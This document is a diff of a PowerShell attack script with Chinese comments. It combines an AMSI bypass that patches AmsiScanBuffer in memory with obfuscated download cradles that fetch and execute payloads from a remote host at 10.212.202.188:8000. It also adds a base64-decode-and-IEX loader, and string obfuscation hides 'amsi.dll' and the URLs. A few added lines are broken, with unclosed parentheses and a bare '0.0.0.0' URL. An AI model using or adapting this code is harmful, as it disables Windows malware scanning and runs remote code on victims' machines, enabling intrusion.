@@ -1,10 +1,23 @@
-$webreq = [System.Net.WebRequest]::Create('http://10.212.202.188:8000/bypass.txt')
+#本地加载powershell进程
+#base64密文储存进字符串
+$Encryption = @'   '@   
+
+#base64解密公式
+解密后的变量 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(加密后的变量))
+$Decryption = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Encryption))
+#IEX 执行字符串
+IEX $Decryption
+
+/*-------------------------------------------------------------------------------------*/
+
+#通过WebRequest的方式远程加载
+$webreq = [System.Net.WebRequest]::Create('http://10.212.202.188:8000/pay.txt')
 $resp=$webreq.GetResponse()
 $respstream=$resp.GetResponseStream()
 $reader=[System.IO.StreamReader]::new($respstream)
 $content=$reader.ReadToEnd()
 
-#Rasta-mouses Amsi-Scan-Buffer patch \n
+#导入windowsAPI
 $clmtz = @"
 using System;
 using System.Runtime.InteropServices;
@@ -17,7 +30,7 @@ public class clmtz {
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr sohbve, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
-
+#通过修补AmsiScanBuffer的功能来阻断amsi.dll的扫描进程
 Add-Type $clmtz
 
 $iopkxhe = [clmtz]::LoadLibrary("$(('àm'+'sí'+'.d'+'ll').NOrmALize([cHAR]([BytE]0x46)+[CHAR](111+51-51)+[cHAR](114)+[ChAr]([bYTE]0x6d)+[CHAr]([byTE]0x44)) -replace [cHaR]([ByTe]0x5c)+[ChAR](112)+[cHAR](123)+[CHaR]([byTe]0x4d)+[CHaR]([bYte]0x6e)+[chAr](125+88-88))")
@@ -34,6 +47,12 @@ $pjlbb = [Byte[]] ($srpa,$ztcq,$vgha,$vujk,+$peii,+$bgxf)
 [System.Runtime.InteropServices.Marshal]::Copy($pjlbb, 0, $nyrkaj, 6)
 IEX($content)
 
-IEX([Net.Webclient]::new().DownloadString("h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@@@@:80@@@@@00/bypas%%%s.tx%%%t".Replace('@@@@@','').Replace('%%%','')))
+/*-----------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
 
+##远程加载方式
+#1.
+IEX([Net.Webclient]::new().DownloadString("0.0.0.0/pay.txt")
+IEX([Net.Webclient]::new().DownloadString("h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@@@@:80@@@@@00/bypas%%%s.tx%%%t".Replace('@@@@@','').Replace('%%%','')))
+#2.
+IEX ((new-object net.webclient).downloadstring("0.0.0.0/pay.txt")
 IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()2.202.188@@@@@:8000/byp**************ass.tx**************t".Replace('@@@@@','').Replace('@!#$%^&*()','').Replace('**************',''))
